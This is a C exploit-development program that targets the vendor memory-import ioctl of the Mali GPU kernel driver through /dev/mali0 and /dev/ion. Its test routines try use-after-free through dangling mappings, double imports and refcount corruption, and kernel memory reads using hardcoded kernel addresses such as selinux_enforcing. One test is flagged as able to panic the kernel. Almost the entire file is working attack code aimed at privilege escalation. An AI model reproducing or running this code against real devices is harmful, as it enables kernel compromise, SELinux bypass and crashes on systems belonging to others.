/*
 * mali_exploit10.c — Exploitation via vendor import dereference
 *
 * CONFIRMED: Vendor MEM_IMPORT directly dereferences phandle as pointer.
 * - Standard path: copy_from_user(kernel_buf, phandle, sizeof(fd)) → safe
 * - Vendor path: fd = *phandle → DATA ABORT on unmapped address → panic!
 * - But with mapped phandle containing valid dma_buf fd → import SUCCEEDS
 *
 * Exploitation angles:
 * 1. Import → mmap → vendor free → dangling mmap (UAF)
 * 2. Import → vendor free → reclaim → re-import (type confusion)
 * 3. Read kernel memory via phandle pointing into kernel space
 * 4. Import→free→import cycle to corrupt reference counts
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd_std(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}
static unsigned int make_cmd_vendor(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16]; memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

static int ion_alloc_dmabuf(int *out_ion_fd, int *out_ion_handle) {
    int ion_fd = open("/dev/ion", O_RDONLY);
    if (ion_fd < 0) return -1;
    struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
        alloc_s = {4096, 4096, 1, 0, 0};
    if (ioctl(ion_fd, 0xc0144900, &alloc_s) < 0) { close(ion_fd); return -1; }
    struct { int32_t handle, fd; } share_s = {alloc_s.handle, 0};
    if (ioctl(ion_fd, 0xc0084904, &share_s) < 0) { close(ion_fd); return -1; }
    *out_ion_fd = ion_fd;
    *out_ion_handle = alloc_s.handle;
    return share_s.fd;
}

static uint64_t vendor_import(int mali_fd, void *phandle_ptr, uint32_t type,
                              uint64_t flags) {
    uint8_t buf[48]; memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)phandle_ptr;
    *(uint32_t*)(buf + 16) = type;
    *(uint64_t*)(buf + 24) = flags;
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    if (((struct uk_header*)buf)->id == 0)
        return *(uint64_t*)(buf + 32);
    return 0;
}

static int vendor_free(int mali_fd, uint64_t gpu_va) {
    uint8_t buf[16]; memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = gpu_va;
    ioctl(mali_fd, make_cmd_vendor(16), buf);
    return ((struct uk_header*)buf)->id;
}

static int std_free(int mali_fd, uint64_t gpu_va) {
    uint8_t buf[16]; memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = gpu_va;
    ioctl(mali_fd, make_cmd_std(16), buf);
    return ((struct uk_header*)buf)->id;
}

/* ============================================================= */
/* TEST 1: Import → mmap → vendor free → dangling mmap           */
/* ============================================================= */
static void test1(void) {
    fprintf(stderr, "\n=== TEST 1: Import + mmap + vendor free UAF ===\n");
    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;

    int ion_fd, ion_handle;
    int dma_fd = ion_alloc_dmabuf(&ion_fd, &ion_handle);
    if (dma_fd < 0) { close(mali_fd); return; }
    fprintf(stderr, "  mali=%d ion=%d dma=%d\n", mali_fd, ion_fd, dma_fd);

    /* Import via vendor dispatch */
    uint64_t gpu_va = vendor_import(mali_fd, &dma_fd, 2, 0xF);
    fprintf(stderr, "  Vendor import: gpu_va=0x%llx\n", (unsigned long long)gpu_va);
    if (!gpu_va) goto done;

    /* Try mmap of the imported region */
    /* Method 1: mmap with pgoff = gpu_va >> PAGE_SHIFT */
    uint32_t pgoff = (uint32_t)(gpu_va >> 12);
    fprintf(stderr, "  Trying mmap pgoff=0x%x\n", pgoff);

    /* Use mmap2 syscall directly to avoid 32-bit overflow */
    void *m = (void *)syscall(192 /* __NR_mmap2 */, NULL, 4096,
                               PROT_READ | PROT_WRITE, MAP_SHARED,
                               mali_fd, pgoff);
    fprintf(stderr, "  mmap2 result: %p (errno=%d)\n", m, errno);

    if (m != MAP_FAILED) {
        /* Write marker before free */
        memset(m, 0x41, 4096);
        fprintf(stderr, "  mmap SUCCEEDED! Wrote 0x41 pattern\n");

        /* Vendor free the region */
        int fr = vendor_free(mali_fd, gpu_va);
        fprintf(stderr, "  Vendor free: result=%d\n", fr);

        /* Check if we can still access the mapping (dangling) */
        uint8_t val = *(volatile uint8_t *)m;
        fprintf(stderr, "  Read after free: 0x%02x (0x41=still mapped)\n", val);

        /* Try to spray into the freed memory */
        /* ... */
        munmap(m, 4096);
    }

    /* Try mmap with the dma_buf fd directly (standard mmap) */
    void *dm = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0);
    if (dm != MAP_FAILED) {
        fprintf(stderr, "  dma_buf mmap: %p ← direct buffer access!\n", dm);
        memset(dm, 0x42, 4096);

        /* Vendor free */
        int fr = vendor_free(mali_fd, gpu_va);
        fprintf(stderr, "  Vendor free: result=%d\n", fr);

        /* Read back via dma_buf mapping */
        uint8_t val = *(volatile uint8_t *)dm;
        fprintf(stderr, "  Read after vendor free via dma_buf: 0x%02x\n", val);
        munmap(dm, 4096);
    } else {
        fprintf(stderr, "  dma_buf mmap: FAILED errno=%d\n", errno);
    }

done:
    close(dma_fd);
    close(ion_fd);
    close(mali_fd);
}

/* ============================================================= */
/* TEST 2: Double import — same buffer imported twice             */
/* Does the second import get a DIFFERENT gpu_va?                 */
/* Can we free one and keep the other?                            */
/* ============================================================= */
static void test2(void) {
    fprintf(stderr, "\n=== TEST 2: Double import ===\n");
    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;

    int ion_fd, ion_handle;
    int dma_fd = ion_alloc_dmabuf(&ion_fd, &ion_handle);
    if (dma_fd < 0) { close(mali_fd); return; }

    uint64_t va1 = vendor_import(mali_fd, &dma_fd, 2, 0xF);
    uint64_t va2 = vendor_import(mali_fd, &dma_fd, 2, 0xF);
    fprintf(stderr, "  Import 1: gpu_va=0x%llx\n", (unsigned long long)va1);
    fprintf(stderr, "  Import 2: gpu_va=0x%llx\n", (unsigned long long)va2);
    fprintf(stderr, "  Same: %s\n", (va1 == va2) ? "YES (deduped)" : "NO (separate)");

    if (va1 && va2 && va1 != va2) {
        /* Free va1, keep va2 */
        int r1 = vendor_free(mali_fd, va1);
        fprintf(stderr, "  Free va1: result=%d\n", r1);

        /* Can we still use va2? */
        uint8_t buf[48]; memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = 515; /* MEM_QUERY */
        *(uint64_t*)(buf + 8) = va2;
        ioctl(mali_fd, make_cmd_vendor(48), buf);
        fprintf(stderr, "  Query va2: result=%u\n", ((struct uk_header*)buf)->id);
    } else if (va1 && va2 && va1 == va2) {
        /* Same VA — free once, does ref count drop? */
        int r1 = vendor_free(mali_fd, va1);
        int r2 = vendor_free(mali_fd, va1);
        fprintf(stderr, "  Free #1: result=%d\n", r1);
        fprintf(stderr, "  Free #2: result=%d\n", r2);
    }

    close(dma_fd);
    close(ion_fd);
    close(mali_fd);
}

/* ============================================================= */
/* TEST 3: Import → close dma_buf fd → mmap via Mali              */
/* If import increments refcount, buffer stays alive after close   */
/* ============================================================= */
static void test3(void) {
    fprintf(stderr, "\n=== TEST 3: Import → close dma_buf → access ===\n");
    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;

    int ion_fd, ion_handle;
    int dma_fd = ion_alloc_dmabuf(&ion_fd, &ion_handle);
    if (dma_fd < 0) { close(mali_fd); return; }
    fprintf(stderr, "  dma_fd=%d\n", dma_fd);

    /* mmap the dma_buf while we have both refs */
    void *dm = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0);
    if (dm == MAP_FAILED) { fprintf(stderr, "  mmap failed\n"); goto done; }
    memset(dm, 0x41, 4096);
    fprintf(stderr, "  dma_buf mapped at %p, wrote 0x41\n", dm);

    /* Import via vendor */
    uint64_t gpu_va = vendor_import(mali_fd, &dma_fd, 2, 0xF);
    fprintf(stderr, "  Import: gpu_va=0x%llx\n", (unsigned long long)gpu_va);

    /* Close the dma_buf fd (but Mali still holds a ref) */
    close(dma_fd);
    fprintf(stderr, "  Closed dma_buf fd\n");

    /* Free the ION handle too */
    struct { int32_t handle; } free_s = {ion_handle};
    ioctl(ion_fd, 0xc0044901, &free_s);
    close(ion_fd);
    fprintf(stderr, "  Freed ION handle and closed ION fd\n");

    /* Read from our mmap — does it still work? */
    uint8_t val = *(volatile uint8_t *)dm;
    fprintf(stderr, "  Read from mmap: 0x%02x (0x41=buffer alive)\n", val);

    /* Now vendor-free the Mali region */
    int fr = vendor_free(mali_fd, gpu_va);
    fprintf(stderr, "  Vendor free Mali region: result=%d\n", fr);

    /* Read again — if buffer is freed, this might be different data */
    val = *(volatile uint8_t *)dm;
    fprintf(stderr, "  Read after Mali free: 0x%02x (0x41=still same, else=FREED!)\n",
            val);

    /* Write to reclaim — if page was freed and we can write, we have UAF */
    *(volatile uint8_t *)dm = 0x42;
    val = *(volatile uint8_t *)dm;
    fprintf(stderr, "  Write+read after free: 0x%02x (0x42=page still ours)\n", val);

    munmap(dm, 4096);
done:
    close(mali_fd);
}

/* ============================================================= */
/* TEST 4: Read kernel memory via phandle                         */
/* Set phandle to a kernel address — if the kernel reads it,      */
/* the value at that address will be used as an fd number.         */
/* This tests whether we can leak info about kernel memory.        */
/* ============================================================= */
static void test4(void) {
    fprintf(stderr, "\n=== TEST 4: Kernel memory read via phandle ===\n");

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;

    /* Open many fds to cover a range of fd numbers */
    int fds[256];
    int nfds = 0;
    for (int i = 0; i < 256; i++) {
        fds[i] = open("/dev/null", O_RDONLY);
        if (fds[i] >= 0) nfds++;
    }
    fprintf(stderr, "  Opened %d extra fds (max fd ~%d)\n", nfds,
            nfds > 0 ? fds[nfds-1] : 0);

    /* Create ION dma_bufs at known fd numbers */
    int ion_fd, ion_handle;
    int dma_fd = ion_alloc_dmabuf(&ion_fd, &ion_handle);
    fprintf(stderr, "  dma_fd=%d\n", dma_fd);

    /* Close the extra fds */
    for (int i = 0; i < nfds; i++) close(fds[i]);

    /* Try kernel addresses where we know certain values exist */
    /* selinux_enforcing ≈ 0xc0b7ad54 — should contain 1 */
    /* If the kernel reads *(int*)0xc0b7ad54 = 1, it uses fd=1 */
    /* fd=1 is stdout — NOT a dma_buf → result=3 */

    /* commit_creds = 0xc0054328 — first bytes are ARM instructions */
    /* The first word of commit_creds() function code */

    /* Try a range of kernel addresses */
    uint32_t addrs[] = {
        0xC0B7AD54,  /* selinux_enforcing (value=1) */
        0xC0B7AD58,  /* selinux_enforcing+4 */
        0xC00A0000,  /* .text region */
        0xC0AC0000,  /* .data region */
    };

    for (int i = 0; i < 4; i++) {
        /* Use this kernel address as phandle */
        uint8_t buf[48]; memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = 513;
        *(uint32_t*)(buf + 8) = addrs[i];  /* phandle = kernel addr */
        *(uint32_t*)(buf + 12) = 0;
        *(uint32_t*)(buf + 16) = 2;        /* type UMM */
        *(uint64_t*)(buf + 24) = 0xF;

        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            int r = ioctl(mali_fd, make_cmd_vendor(48), buf);
            uint32_t result = ((struct uk_header*)buf)->id;
            fprintf(stderr, "  0x%08x: ioctl=%d result=%u",
                    addrs[i], r, result);
            if (result == 0)
                fprintf(stderr, " ← IMPORT SUCCEEDED! fd value matched!");
            fprintf(stderr, "\n");
            _exit(0);
        }
        int st;
        waitpid(pid, &st, 0);
        if (WIFSIGNALED(st))
            fprintf(stderr, "  0x%08x: CRASHED (signal %d) ← KERNEL PANIC\n",
                    addrs[i], WTERMSIG(st));
    }

    close(dma_fd);
    close(ion_fd);
    close(mali_fd);
}

/* ============================================================= */
/* TEST 5: Full response buffer from SUCCESSFUL import            */
/* ============================================================= */
static void test5(void) {
    fprintf(stderr, "\n=== TEST 5: Successful import response analysis ===\n");
    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;

    int ion_fd, ion_handle;
    int dma_fd = ion_alloc_dmabuf(&ion_fd, &ion_handle);
    fprintf(stderr, "  dma_fd=%d\n", dma_fd);

    /* Initialize response buffer with marker pattern */
    uint8_t buf[48];
    memset(buf, 0xCC, 48);
    ((struct uk_header*)buf)->id = 513;
    ((struct uk_header*)buf)->ret = 0;
    *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&dma_fd;
    *(uint32_t*)(buf + 16) = 2;
    *(uint32_t*)(buf + 20) = 0xCCCCCCCC;
    *(uint64_t*)(buf + 24) = 0xF;

    ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  result=%u\n", ((struct uk_header*)buf)->id);
    fprintf(stderr, "  Full response:\n");
    for (int i = 0; i < 48; i += 4) {
        uint32_t v = *(uint32_t*)(buf + i);
        const char *note = "";
        if (v == 0xCCCCCCCC) note = " (unchanged)";
        else if (v >= 0xC0000000 && v <= 0xD0000000) note = " ← KERNEL PTR?";
        fprintf(stderr, "    [%2d] 0x%08x%s\n", i, v, note);
    }

    /* Also try with 0x4000-page import */
    fprintf(stderr, "\n  Large buffer import:\n");
    int ion2;
    struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
        alloc2 = {0x4000, 0x1000, 1, 0, 0};
    ion2 = open("/dev/ion", O_RDONLY);
    ioctl(ion2, 0xc0144900, &alloc2);
    struct { int32_t handle, fd; } share2 = {alloc2.handle, 0};
    ioctl(ion2, 0xc0084904, &share2);
    int dma2 = share2.fd;
    fprintf(stderr, "  dma2=%d (16KB buffer)\n", dma2);

    memset(buf, 0xCC, 48);
    ((struct uk_header*)buf)->id = 513;
    ((struct uk_header*)buf)->ret = 0;
    *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&dma2;
    *(uint32_t*)(buf + 16) = 2;
    *(uint64_t*)(buf + 24) = 0xF;
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  result=%u\n", ((struct uk_header*)buf)->id);
    for (int i = 0; i < 48; i += 4) {
        uint32_t v = *(uint32_t*)(buf + i);
        const char *note = "";
        if (v == 0xCCCCCCCC) note = " (unchanged)";
        else if (v >= 0xC0000000 && v <= 0xD0000000) note = " ← KERNEL PTR?";
        fprintf(stderr, "    [%2d] 0x%08x%s\n", i, v, note);
    }

    close(dma2); close(ion2);
    close(dma_fd); close(ion_fd);
    close(mali_fd);
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== Mali Import Exploitation ===\n");
    fprintf(stderr, "PID=%d UID=%d\n", getpid(), getuid());

    int test = 0;
    if (argc >= 2) test = atoi(argv[1]);

    if (test == 0 || test == 1) { pid_t p = fork(); if (!p) { alarm(10); test1(); _exit(0); }
        int st; waitpid(p, &st, 0); }
    if (test == 0 || test == 2) { pid_t p = fork(); if (!p) { alarm(10); test2(); _exit(0); }
        int st; waitpid(p, &st, 0); }
    if (test == 0 || test == 3) { pid_t p = fork(); if (!p) { alarm(10); test3(); _exit(0); }
        int st; waitpid(p, &st, 0); }
    /* TEST 4 IS DANGEROUS — may crash kernel */
    if (test == 4) { pid_t p = fork(); if (!p) { alarm(10); test4(); _exit(0); }
        int st; waitpid(p, &st, 0); }
    if (test == 0 || test == 5) { pid_t p = fork(); if (!p) { alarm(10); test5(); _exit(0); }
        int st; waitpid(p, &st, 0); }

    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
